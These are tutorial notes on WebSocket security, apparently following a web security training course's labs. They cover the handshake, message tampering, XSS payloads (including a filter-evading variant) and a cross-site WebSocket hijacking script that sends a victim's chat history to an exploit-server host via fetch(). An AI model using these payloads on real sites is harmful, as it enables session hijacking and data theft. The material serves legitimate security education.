## What are WebSockets?

WebSockets are a bi-directional, full duplex communications protocol initiated over HTTP. They are commonly used in modern web applications for streaming data and other asynchronous traffic.
### What is the difference between HTTP and WebSockets?

Most communication between web browsers and web sites uses HTTP. With HTTP, the client sends a request and the server returns a response. Typically, the response occurs immediately, and the transaction is complete. Even if the network connection stays open, this will be used for a separate transaction of a request and a response.

Some modern web sites use WebSockets. WebSocket connections are initiated over HTTP and are typically long-lived. Messages can be sent in either direction at any time and are not transactional in nature. The connection will normally stay open and idle until either the client or the server is ready to send a message.

WebSockets are particularly useful in situations where low-latency or server-initiated messages are required, such as real-time feeds of financial data. 
### How are WebSocket connections established?

WebSocket connections are normally created using client-side JavaScript like the following:

`var ws = new WebSocket("wss://normal-website.com/chat");`


>The wss protocol establishes a WebSocket over an encrypted TLS connection, while the ws protocol uses an unencrypted connection.

To establish the connection, the browser and server perform a WebSocket handshake over HTTP. The browser issues a WebSocket handshake request like the following:
```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
If the server accepts the connection, it returns a WebSocket handshake response like the following:
```
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
At this point, the network connection remains open and can be used to send WebSocket messages in either direction.
Note

Several features of the WebSocket handshake messages are worth noting:

-    The `Connection` and `Upgrade` headers in the request and response indicate that this is a WebSocket handshake.
-    The `Sec-WebSocket-Version` request header specifies the WebSocket protocol version that the client wishes to use. This is typically 13.
-    The `Sec-WebSocket-Key` request header contains a Base64-encoded random value, which should be randomly generated in each handshake request.
-    The `Sec-WebSocket-Accept` response header contains a hash of the value submitted in the Sec-WebSocket-Key request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.

### What do WebSocket messages look like?

Once a WebSocket connection has been established, messages can be sent asynchronously in either direction by the client or server.

A simple message could be sent from the browser using client-side JavaScript like the following:
`ws.send("Peter Wiener");`

In principle, WebSocket messages can contain any content or data format. In modern applications, it is common for JSON to be used to send structured data within WebSocket messages.

For example, a chat-bot application using WebSockets might send a message like the following:
`{"user":"Hal Pline","content":"I wanted to be a Playstation growing up, not a device to answer your inane questions"}`

## Manipulating WebSocket traffic

The majority of input-based vulnerabilities affecting WebSockets can be found and exploited by tampering with the contents of WebSocket messages.

For example, suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:
`{"message":"Hello Carlos"}`

The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows:
`<td>Hello Carlos</td>`

In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:
`{"message":"<img src=1 onerror='alert(1)'>"}`

### Lab: Manipulating WebSocket messages to exploit vulnerabilities

To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser. 



Edit the intercepted message to contain the following payload:
`<img src=1 onerror='alert(1)'>`

## Manipulating the WebSocket handshake to exploit vulnerabilities

Some WebSockets vulnerabilities can only be found and exploited by manipulating the WebSocket handshake. These vulnerabilities tend to involve design flaws, such as:

-    Misplaced trust in HTTP headers to perform security decisions, such as the X-Forwarded-For header.
-    Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
-    Attack surface introduced by custom HTTP headers used by the application.

### Lab: Manipulating the WebSocket handshake to exploit vulnerabilities

It has an aggressive but flawed XSS filter.

To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser. 

Payload: ``<img src=1 oNeRrOr=alert`1`>``

## Using cross-site WebSockets to exploit vulnerabilities


### Cross-site WebSocket hijacking?

Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.

An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.

The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.

For example, the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie:
```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
ll
>The Sec-WebSocket-Key header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.
### Lab: Cross-site WebSocket hijacking

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account. 

Payload:
```html
<script>
    var ws = new WebSocket(
    "wss://0a8b00bf040fb76b82d8152000790054.web-security-academy.net/chat"
  );
  
  ws.onopen = function () {
    ws.send("READY");
  };
  
  ws.onmessage = function (event) {
    fetch(
      "https://exploit-0a050000047fb76182bb14d501740069.exploit-server.net/exploit?message=" +
        btoa(event.data)
    );
  };
</script>
```
## 
How to secure a WebSocket connection

To minimize the risk of security vulnerabilities arising with WebSockets, use the following guidelines:

-   Use the wss:// protocol (WebSockets over TLS).
-    Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.
-    Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.
-    Treat data received via the WebSocket as untrusted in both directions. Handle data safely on both the server and client ends, to prevent input-based vulnerabilities such as SQL injection and cross-site scripting.

